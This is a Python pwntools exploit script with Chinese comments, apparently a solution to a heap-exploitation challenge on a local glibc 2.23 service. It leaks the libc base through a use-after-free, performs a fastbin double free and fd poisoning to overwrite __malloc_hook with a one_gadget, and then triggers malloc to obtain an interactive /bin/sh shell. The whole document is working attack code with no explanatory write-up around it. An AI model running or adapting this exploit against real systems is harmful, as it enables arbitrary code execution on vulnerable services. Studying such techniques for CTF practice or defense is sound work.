#!/usr/bin/env python3
from pwn import *

HOST, PORT = '127.0.0.1', 13377
r = remote(HOST, PORT)

context.arch = 'amd64'

# 需要与远程相同版本的 libc（ubuntu 16.04, glibc 2.23）
libc = ELF('./libc.so.6', checksec=False)

mhook_off   = libc.symbols['__malloc_hook']
arena88_off = 0x3c4b78   # main_arena+88 相对 libc 基址的偏移
og_off      = 0x4527a    # one_gadget: execve("/bin/sh", rsp+0x30, environ)
                          # 约束: [rsp+0x30] == NULL（malloc 调用时通常满足）

def alloc(size, data):
    r.recvuntil(b'exit\n'); r.sendline(b'1')
    r.recvuntil(b'size: '); r.sendline(str(size).encode())
    r.recvuntil(b'data: '); r.send(data)

def delete(idx):
    r.recvuntil(b'exit\n'); r.sendline(b'2')
    r.recvuntil(b'index: '); r.sendline(str(idx).encode())

def view(idx):
    r.recvuntil(b'exit\n'); r.sendline(b'4')
    r.recvuntil(b'index: '); r.sendline(str(idx).encode())
    return r.recv(8)

# ── 1. 泄漏 libc 基址 ─────────────────────────────────────────────
# free 一个 small chunk（>= 0x80）进入 unsorted bin
# unsorted bin 的 fd 指向 main_arena+88（libc 内部地址）
alloc(0x80, b'A'*8)   # idx 0  泄漏用
alloc(0x80, b'B'*8)   # idx 1  隔离，防止 free(0) 与 top chunk 合并
delete(0)
leak = u64(view(0))   # UAF：free 后 chunks[0] 不清零，fd 可读
libc_base = leak - arena88_off
og          = libc_base + og_off
fake_chunk  = libc_base + mhook_off - 0x23   # fastbin attack 目标

log.info(f'libc_base:  {hex(libc_base)}')
log.info(f'one_gadget: {hex(og)}')

# ── 2. fastbin double free ────────────────────────────────────────
# 分配两个 fastbin 大小的 chunk（size 0x70，用户数据 0x60）
alloc(0x60, b'C'*8)   # idx 2
alloc(0x60, b'D'*8)   # idx 3

# double free 绕过 glibc 2.23 的单步检测（只检查 head == chunk）
# 交叉 free：2 -> 3 -> 2，fastbin 链: 2 -> 3 -> 2 -> ...
delete(2)
delete(3)
delete(2)

# ── 3. 投毒 fd，指向 fake chunk ───────────────────────────────────
# fake chunk 在 __malloc_hook - 0x23
# 运行时该地址 -8 处（size 字段）= 0x7f（来自 __memalign_hook 地址的高字节）
# 0x7f & ~7 = 0x78，对应 fastbin[5]，与 alloc(0x60) 的 fastbin 一致
alloc(0x60, p64(fake_chunk))  # idx 4，chunk2 fd -> fake_chunk
alloc(0x60, b'E'*8)           # idx 5，chunk3
alloc(0x60, b'F'*8)           # idx 6，chunk2（循环）

# ── 4. 分配 fake chunk，覆盖 __malloc_hook ────────────────────────
# malloc 返回 fake_chunk + 16 = __malloc_hook - 0x13
# 写入偏移 0x13 处 = __malloc_hook
alloc(0x60, b'\x00'*0x13 + p64(og))  # idx 7

# ── 5. 触发 __malloc_hook ─────────────────────────────────────────
# 任意 malloc 调用都会跳到 one_gadget -> execve("/bin/sh")
r.recvuntil(b'exit\n'); r.sendline(b'1')
r.recvuntil(b'size: '); r.sendline(b'8')

r.interactive()
